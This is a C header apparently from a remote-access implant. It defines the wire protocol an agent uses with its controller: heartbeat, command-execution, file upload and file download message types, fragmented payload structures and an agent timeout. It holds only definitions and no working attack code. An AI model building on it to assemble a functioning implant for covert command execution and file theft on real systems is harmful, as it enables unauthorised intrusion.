#include <stdint.h>
#include <assert.h>

#ifndef _IMPLANT_H
#define _IMPLANT_H

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define TYPE_ALIVE			0
#define TYPE_COMMAND		1
#define TYPE_PUT_FILE		2
#define TYPE_PUT_FILE_NAME	3
#define TYPE_GET_FILE		4
#define TYPE_GET_FILE_NAME	5

#define RET_ERROR	-1
#define RET_OK		0

#define FRAGMENT_SIZE		4096
#define FIRST_PAYLOAD_SIZE	4084
#define NEXT_PAYLOAD_SIZE	4088

// #define BUFFERSIZE		4096
// #define FRAGMENTSIZE	BUFFERSIZE + 8
#define AGENT_TIMEOUT	60

// macro to return size of structure field
#define member_size(type, member)	(sizeof( ((type *)0)->member))

typedef struct First_Payload{
	int32_t total_size;
	union {
		char actual_payload[FIRST_PAYLOAD_SIZE];
		uint32_t alive_time;
	};
	
} First_Payload;

typedef struct Fragment{
	int32_t type;						// type of message (0 for alive, 1 for command)
	int32_t index;						// index of fragment in complete message
	union {
		char next_payload[NEXT_PAYLOAD_SIZE];			// payload
		First_Payload first_payload;
	};
} Fragment;

// Make sure that we have the correct payload sizes defined
// Check FIRST_PAYLOAD_SIZE
static_assert(FRAGMENT_SIZE == FIRST_PAYLOAD_SIZE + member_size(Fragment, type) + member_size(Fragment, index) + member_size(First_Payload, total_size));
// Check NEXT_PAYLOAD_SIZE
static_assert(FRAGMENT_SIZE == NEXT_PAYLOAD_SIZE + member_size(Fragment, type) + member_size(Fragment, index));

#endif /* _IMPLANT_H */